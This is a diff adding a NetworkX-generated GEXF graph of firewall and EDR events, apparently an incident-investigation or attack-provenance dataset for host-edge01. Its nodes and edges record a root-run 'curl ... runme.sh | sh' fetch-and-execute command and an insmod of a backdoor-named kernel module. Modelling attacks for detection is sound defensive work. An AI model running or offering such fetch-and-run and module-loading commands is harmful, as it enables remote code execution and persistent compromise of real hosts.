@@ -1,0 +1,235 @@
+<?xml version='1.0' encoding='utf-8'?>
+<gexf xmlns="http://www.gexf.net/1.2draft" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.gexf.net/1.2draft http://www.gexf.net/1.2draft/gexf.xsd" version="1.2">
+  <meta lastmodifieddate="2026-02-02">
+    <creator>NetworkX 3.4.2</creator>
+  </meta>
+  <graph defaultedgetype="directed" mode="static" name="">
+    <attributes mode="static" class="edge">
+      <attribute id="2" title="action" type="string" />
+      <attribute id="3" title="ts" type="string" />
+      <attribute id="4" title="dpt" type="long" />
+      <attribute id="5" title="raw" type="string" />
+      <attribute id="6" title="networkx_key" type="long" />
+    </attributes>
+    <attributes mode="static" class="node">
+      <attribute id="0" title="type" type="string" />
+      <attribute id="1" title="user" type="string" />
+    </attributes>
+    <nodes>
+      <node id="host:fw01" label="host:fw01">
+        <attvalues>
+          <attvalue for="0" value="host" />
+        </attvalues>
+      </node>
+      <node id="ip:10.1.2.45" label="ip:10.1.2.45">
+        <attvalues>
+          <attvalue for="0" value="ip" />
+        </attvalues>
+      </node>
+      <node id="ip:10.1.2.10" label="ip:10.1.2.10">
+        <attvalues>
+          <attvalue for="0" value="ip" />
+        </attvalues>
+      </node>
+      <node id="port:22" label="port:22">
+        <attvalues>
+          <attvalue for="0" value="port" />
+        </attvalues>
+      </node>
+      <node id="port:80" label="port:80">
+        <attvalues>
+          <attvalue for="0" value="port" />
+        </attvalues>
+      </node>
+      <node id="host:host-edge01" label="host:host-edge01">
+        <attvalues>
+          <attvalue for="0" value="host" />
+        </attvalues>
+      </node>
+      <node id="process:4421@host-edge01" label="process:4421@host-edge01">
+        <attvalues>
+          <attvalue for="0" value="process" />
+          <attvalue for="1" value="root" />
+        </attvalues>
+      </node>
+      <node id="process:4320@host-edge01" label="process:4320@host-edge01">
+        <attvalues>
+          <attvalue for="0" value="process" />
+        </attvalues>
+      </node>
+      <node id="cmd:/bin/sh -c curl -s http://10.2.3.10/bin/runme.sh | sh" label="cmd:/bin/sh -c curl -s http://10.2.3.10/bin/runme.sh | sh">
+        <attvalues>
+          <attvalue for="0" value="cmd" />
+        </attvalues>
+      </node>
+      <node id="file:/bin/sh" label="file:/bin/sh">
+        <attvalues>
+          <attvalue for="0" value="file" />
+        </attvalues>
+      </node>
+      <node id="file://10.2.3.10/bin/runme.sh" label="file://10.2.3.10/bin/runme.sh">
+        <attvalues>
+          <attvalue for="0" value="file" />
+        </attvalues>
+      </node>
+      <node id="ip:10.2.3.10" label="ip:10.2.3.10">
+        <attvalues>
+          <attvalue for="0" value="ip" />
+        </attvalues>
+      </node>
+      <node id="process:4533@host-edge01" label="process:4533@host-edge01">
+        <attvalues>
+          <attvalue for="0" value="process" />
+          <attvalue for="1" value="root" />
+        </attvalues>
+      </node>
+      <node id="cmd:/usr/bin/insmod /tmp/bpfdoor.ko | parent_chain: sshd(120)-bash(4321)-curl(4421)-sh(4530)-insmod(4533)" label="cmd:/usr/bin/insmod /tmp/bpfdoor.ko | parent_chain: sshd(120)-bash(4321)-curl(4421)-sh(4530)-insmod(4533)">
+        <attvalues>
+          <attvalue for="0" value="cmd" />
+        </attvalues>
+      </node>
+      <node id="file:/usr/bin/insmod" label="file:/usr/bin/insmod">
+        <attvalues>
+          <attvalue for="0" value="file" />
+        </attvalues>
+      </node>
+      <node id="file:/tmp/bpfdoor.ko" label="file:/tmp/bpfdoor.ko">
+        <attvalues>
+          <attvalue for="0" value="file" />
+        </attvalues>
+      </node>
+    </nodes>
+    <edges>
+      <edge source="ip:10.1.2.45" target="ip:10.1.2.10" id="0">
+        <attvalues>
+          <attvalue for="2" value="net_attempt" />
+          <attvalue for="3" value="2025-10-01T10:12:34" />
+          <attvalue for="4" value="22" />
+          <attvalue for="5" value="2025-10-01T10:12:34 fw01 kernel: DROP IN=eth1 SRC=10.1.2.45 DST=10.1.2.10 DPT=22" />
+          <attvalue for="6" value="0" />
+        </attvalues>
+      </edge>
+      <edge source="ip:10.1.2.45" target="ip:10.1.2.10" id="1">
+        <attvalues>
+          <attvalue for="2" value="net_attempt" />
+          <attvalue for="3" value="2025-10-01T10:12:34" />
+          <attvalue for="4" value="80" />
+          <attvalue for="5" value="2025-10-01T10:12:34 fw01 kernel: DROP IN=eth1 SRC=10.1.2.45 DST=10.1.2.10 DPT=80" />
+          <attvalue for="6" value="1" />
+        </attvalues>
+      </edge>
+      <edge source="ip:10.1.2.10" target="port:22" id="2">
+        <attvalues>
+          <attvalue for="2" value="target_port" />
+          <attvalue for="3" value="2025-10-01T10:12:34" />
+          <attvalue for="5" value="2025-10-01T10:12:34 fw01 kernel: DROP IN=eth1 SRC=10.1.2.45 DST=10.1.2.10 DPT=22" />
+          <attvalue for="6" value="0" />
+        </attvalues>
+      </edge>
+      <edge source="ip:10.1.2.10" target="port:80" id="3">
+        <attvalues>
+          <attvalue for="2" value="target_port" />
+          <attvalue for="3" value="2025-10-01T10:12:34" />
+          <attvalue for="5" value="2025-10-01T10:12:34 fw01 kernel: DROP IN=eth1 SRC=10.1.2.45 DST=10.1.2.10 DPT=80" />
+          <attvalue for="6" value="0" />
+        </attvalues>
+      </edge>
+      <edge source="host:host-edge01" target="process:4421@host-edge01" id="4">
+        <attvalues>
+          <attvalue for="2" value="process_create" />
+          <attvalue for="3" value="2025-10-01T10:15:05" />
+          <attvalue for="5" value="2025-10-01T10:15:05 host-edge01 EDR: process_create pid=4421 ppid=4320 user=root cmdline=&quot;/bin/sh -c curl -s http://10.2.3.10/bin/runme.sh | sh&quot;" />
+          <attvalue for="6" value="0" />
+        </attvalues>
+      </edge>
+      <edge source="host:host-edge01" target="process:4533@host-edge01" id="5">
+        <attvalues>
+          <attvalue for="2" value="process_create" />
+          <attvalue for="3" value="2025-10-01T10:19:58" />
+          <attvalue for="5" value="2025-10-01T10:19:58 host-edge01 EDR: process_create pid=4533 ppid=4421 user=root cmdline=&quot;/usr/bin/insmod /tmp/bpfdoor.ko&quot; parent_chain: sshd(120)-bash(4321)-curl(4421)-sh(4530)-insmod(4533)" />
+          <attvalue for="6" value="0" />
+        </attvalues>
+      </edge>
+      <edge source="process:4421@host-edge01" target="cmd:/bin/sh -c curl -s http://10.2.3.10/bin/runme.sh | sh" id="6">
+        <attvalues>
+          <attvalue for="2" value="exec_cmd" />
+          <attvalue for="3" value="2025-10-01T10:15:05" />
+          <attvalue for="5" value="2025-10-01T10:15:05 host-edge01 EDR: process_create pid=4421 ppid=4320 user=root cmdline=&quot;/bin/sh -c curl -s http://10.2.3.10/bin/runme.sh | sh&quot;" />
+          <attvalue for="6" value="0" />
+        </attvalues>
+      </edge>
+      <edge source="process:4421@host-edge01" target="file:/bin/sh" id="7">
+        <attvalues>
+          <attvalue for="2" value="touches_file" />
+          <attvalue for="3" value="2025-10-01T10:15:05" />
+          <attvalue for="5" value="2025-10-01T10:15:05 host-edge01 EDR: process_create pid=4421 ppid=4320 user=root cmdline=&quot;/bin/sh -c curl -s http://10.2.3.10/bin/runme.sh | sh&quot;" />
+          <attvalue for="6" value="0" />
+        </attvalues>
+      </edge>
+      <edge source="process:4421@host-edge01" target="file://10.2.3.10/bin/runme.sh" id="8">
+        <attvalues>
+          <attvalue for="2" value="touches_file" />
+          <attvalue for="3" value="2025-10-01T10:15:05" />
+          <attvalue for="5" value="2025-10-01T10:15:05 host-edge01 EDR: process_create pid=4421 ppid=4320 user=root cmdline=&quot;/bin/sh -c curl -s http://10.2.3.10/bin/runme.sh | sh&quot;" />
+          <attvalue for="6" value="0" />
+        </attvalues>
+      </edge>
+      <edge source="process:4421@host-edge01" target="ip:10.2.3.10" id="9">
+        <attvalues>
+          <attvalue for="2" value="connects_to" />
+          <attvalue for="3" value="2025-10-01T10:15:05" />
+          <attvalue for="5" value="2025-10-01T10:15:05 host-edge01 EDR: process_create pid=4421 ppid=4320 user=root cmdline=&quot;/bin/sh -c curl -s http://10.2.3.10/bin/runme.sh | sh&quot;" />
+          <attvalue for="6" value="0" />
+        </attvalues>
+      </edge>
+      <edge source="process:4421@host-edge01" target="process:4533@host-edge01" id="10">
+        <attvalues>
+          <attvalue for="2" value="spawn" />
+          <attvalue for="3" value="2025-10-01T10:19:58" />
+          <attvalue for="5" value="2025-10-01T10:19:58 host-edge01 EDR: process_create pid=4533 ppid=4421 user=root cmdline=&quot;/usr/bin/insmod /tmp/bpfdoor.ko&quot; parent_chain: sshd(120)-bash(4321)-curl(4421)-sh(4530)-insmod(4533)" />
+          <attvalue for="6" value="0" />
+        </attvalues>
+      </edge>
+      <edge source="process:4320@host-edge01" target="process:4421@host-edge01" id="11">
+        <attvalues>
+          <attvalue for="2" value="spawn" />
+          <attvalue for="3" value="2025-10-01T10:15:05" />
+          <attvalue for="5" value="2025-10-01T10:15:05 host-edge01 EDR: process_create pid=4421 ppid=4320 user=root cmdline=&quot;/bin/sh -c curl -s http://10.2.3.10/bin/runme.sh | sh&quot;" />
+          <attvalue for="6" value="0" />
+        </attvalues>
+      </edge>
+      <edge source="process:4533@host-edge01" target="cmd:/usr/bin/insmod /tmp/bpfdoor.ko | parent_chain: sshd(120)-bash(4321)-curl(4421)-sh(4530)-insmod(4533)" id="12">
+        <attvalues>
+          <attvalue for="2" value="exec_cmd" />
+          <attvalue for="3" value="2025-10-01T10:19:58" />
+          <attvalue for="5" value="2025-10-01T10:19:58 host-edge01 EDR: process_create pid=4533 ppid=4421 user=root cmdline=&quot;/usr/bin/insmod /tmp/bpfdoor.ko&quot; parent_chain: sshd(120)-bash(4321)-curl(4421)-sh(4530)-insmod(4533)" />
+          <attvalue for="6" value="0" />
+        </attvalues>
+      </edge>
+      <edge source="process:4533@host-edge01" target="file:/usr/bin/insmod" id="13">
+        <attvalues>
+          <attvalue for="2" value="touches_file" />
+          <attvalue for="3" value="2025-10-01T10:19:58" />
+          <attvalue for="5" value="2025-10-01T10:19:58 host-edge01 EDR: process_create pid=4533 ppid=4421 user=root cmdline=&quot;/usr/bin/insmod /tmp/bpfdoor.ko&quot; parent_chain: sshd(120)-bash(4321)-curl(4421)-sh(4530)-insmod(4533)" />
+          <attvalue for="6" value="0" />
+        </attvalues>
+      </edge>
+      <edge source="process:4533@host-edge01" target="file:/tmp/bpfdoor.ko" id="14">
+        <attvalues>
+          <attvalue for="2" value="touches_file" />
+          <attvalue for="3" value="2025-10-01T10:19:58" />
+          <attvalue for="5" value="2025-10-01T10:19:58 host-edge01 EDR: process_create pid=4533 ppid=4421 user=root cmdline=&quot;/usr/bin/insmod /tmp/bpfdoor.ko&quot; parent_chain: sshd(120)-bash(4321)-curl(4421)-sh(4530)-insmod(4533)" />
+          <attvalue for="6" value="0" />
+        </attvalues>
+      </edge>
+      <edge source="process:4533@host-edge01" target="file:/tmp/bpfdoor.ko" id="15">
+        <attvalues>
+          <attvalue for="2" value="loads_module" />
+          <attvalue for="3" value="2025-10-01T10:19:58" />
+          <attvalue for="5" value="2025-10-01T10:19:58 host-edge01 EDR: process_create pid=4533 ppid=4421 user=root cmdline=&quot;/usr/bin/insmod /tmp/bpfdoor.ko&quot; parent_chain: sshd(120)-bash(4321)-curl(4421)-sh(4530)-insmod(4533)" />
+          <attvalue for="6" value="1" />
+        </attvalues>
+      </edge>
+    </edges>
+  </graph>
+</gexf>
